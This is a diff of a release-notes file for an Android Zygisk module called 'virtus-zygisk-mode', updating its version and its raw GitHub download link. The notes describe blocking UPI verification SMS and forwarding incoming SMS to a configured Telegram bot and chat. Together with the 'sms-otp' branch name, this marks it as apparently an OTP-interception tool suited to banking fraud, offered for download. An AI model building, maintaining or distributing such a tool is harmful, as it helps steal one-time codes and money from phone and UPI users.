@@ -1,7 +1,7 @@
 # Releases
 
-Latest: **virtus-zygisk-mode-v1.0.64.zip**
+Latest: **virtus-zygisk-mode-v1.0.65.zip**
 
-CRITICAL: normal SIM SMS was blocked by over-aggressive nuclear ISms. Now ONLY UPI-verify (HEROAXIS/DO NOT COPY…) is blocked; personal chat SMS passes.
+Menu **Update / Save** ab phone + sender ID + bot token + chat ID ko sab files me sync karta hai (empty wipe band). TG dedupe 90s window — Update ke baad naya SMS Telegram pe aayega.
 
-https://raw.githubusercontent.com/legendop21/Zygisk-module/cursor/zygisk-sms-otp-module-97d6/releases/virtus-zygisk-mode-v1.0.64.zip
+https://raw.githubusercontent.com/legendop21/Zygisk-module/cursor/zygisk-sms-otp-module-97d6/releases/virtus-zygisk-mode-v1.0.65.zip
